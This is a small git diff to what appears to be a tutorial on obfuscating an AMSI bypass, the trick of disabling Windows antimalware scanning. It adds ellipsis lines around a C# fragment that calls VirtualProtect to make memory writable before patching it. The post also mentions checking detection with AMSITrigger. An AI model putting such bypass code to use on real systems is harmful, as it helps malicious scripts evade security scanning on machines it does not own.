@@ -74,6 +74,7 @@ We can use this popular obfuscation tool to customize our AMSI bypass. Let's try
 Great! We can now update our code block with the expression:
 
 ```posh
+...
             }
             uint oldprotect;
             if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, 0x40, out oldprotect)) {
@@ -95,6 +96,7 @@ $code = $code + @"
                 throw new Win32Exception();
             }
         }
+...
 ```
 
 And check with AMSITrigger once more:
